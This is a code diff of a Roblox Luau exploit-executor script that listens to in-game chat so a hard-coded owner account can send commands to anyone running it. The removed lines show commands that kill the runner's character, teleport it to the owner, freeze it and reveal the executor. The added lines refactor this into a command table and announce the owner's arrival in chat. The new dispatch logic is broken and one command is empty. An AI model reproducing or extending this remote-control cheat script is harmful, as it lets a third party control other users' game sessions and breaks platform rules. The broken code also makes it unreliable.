@@ -11,12 +11,12 @@ vars = {
   chatv = txs.ChatVersion == Enum.ChatVersion.LegacyChatService,
   s_cal = false, prefix = "/",
   frz = false,
+  cmds = {},
   owners = {"bloxfruits_devs09"}
 }
 plr = plrs.LocalPlayer
 
-function ntfc(m)
-  m = tostring(m)
+function ntfc(m) m = tostring(m)
   if not vars.chatv then
     txs.TextChannels.RBXGeneral:SendAsync(m)
   else
@@ -24,14 +24,8 @@ function ntfc(m)
   end
 end
 
-function str_check(x, t, n)
-  if not x or not x.Name then return false end
-  local lname = tostring(x.Name):lower()
-  if table.find(vars.owners, lname) and x.DisplayName then
-    ntfc("<Roger: "..x.DisplayName:sub(1, 4).."...>")
-  end
-  return t == vars.prefix..n
-end
+function total() return plrs:GetPlayers() end
+function same(t) return t.Name:lower() end
 
 function rcv_hrp(t)
   return t and t.Character and t.Character:FindFirstChild("HumanoidRootPart")
@@ -59,37 +53,45 @@ function nearby_t()
   return t.n
 end
 
-function do_cmd(sender, msg)
-  local info = {hrp = rcv_hrp(sender), hmoid = rcv_hmoid(sender), alive = t_alive(sender)}
-  local s = {hrp = rcv_hrp(plr), hmoid = rcv_hmoid(plr), alive = t_alive(plr)}
-  if table.find(vars.owners, tostring(plr.Name):lower()) then return end
-  if str_check(sender, msg, "rs") then
-    if s.hmoid and s.alive then s.hmoid.Health = 0 end
-  elseif str_check(sender, msg, "br") then
-    if s.hrp and s.alive and info.hrp and info.alive then
-      s.hrp.CFrame = CFrame.new(info.hrp.Position + (info.hrp.CFrame.LookVector * 5))
-    end
-  elseif str_check(sender, msg, "frz") then
-    if not vars.frz then
-      s.hrp.Anchored = vars.frz
-    else
-      s.hrp.Anchored = vars.frz
-    end vars.frz = not vars.frz
-  elseif str_check(sender, msg, "idt") then
-    if identifyexecutor then ntfc(tostring(identifyexecutor())) else ntfc("api doesn't exist...") end
-  elseif str_check(sender, msg, "cmds") then
-    ntfc("prefix:\""..vars.prefix.."\", rs, br, idt, cmds")
-  end
+function add_cmd(n, d, f) vars.cmds[n] = {desc = d, func = f} end
+function run_cmd(n, ...)
+  for name, _ in next, vars.cmds do
+    if name ~= n then return end
+  end vars.cmds[n].func(table.unpack({...}))
 end
 
-function do_connect(player)
-  if not player then return end
-  player.Chatted:Connect(function(message)
-    local parts = tostring(message):split(" ")
-    do_cmd(player, parts[1])
+-- Commands Section --
+add_cmd("prefix", "change cmds prefix", function(nf)
+  vars.prefix = nf
+  ntfc("prefix changed to: "..nf)
+end)
+
+add_cmd("hp", "change health", function(n, amount)
+
+end)
+-- Close Commands Section --
+
+function do_connect(t)
+  t.Chatted:Connect(function(s)
+    s = s:split(" ")
+    if s and type(s) == "table" and #s > 0 then
+      run_cmd(s[1], table.concat(s, " ", 2):split(" "))
+    end
   end)
 end
 
--- after learning js n html again, i think i'm getting dumb at lua/luau --
-for _, user in next, plrs:GetPlayers() do if user then do_connect(user) if user.Name and table.find(vars.owners, user.Name:lower()) then ntfc("[!]: "..(user.DisplayName or user.Name).." is here.") end end end
-plrs.PlayerAdded:Connect(function(player) if player then do_connect(player) if player.Name and table.find(vars.owners, player.Name:lower()) then ntfc("[!]: "..(player.DisplayName or player.Name).." has joined the server.") end end end)
+for _, user in next, total() do
+  if user then do_connect(user)
+    if same(plr) ~= same(user) and table.find(vars.owners, user.Name:lower()) then
+      ntfc("<I Found You, Commander "..user.DisplayName:sub(1, 4)..">")
+    end
+  end
+end
+
+plrs.PlayerAdded:Connect(function(user)
+  if user then do_connect(user)
+    if same(plr) ~= same(user) and table.find(vars.owners, user.Name:lower()) then
+      ntfc("<Welcome, Commander "..user.DisplayName:sub(1, 4)..">")
+    end
+  end
+end)
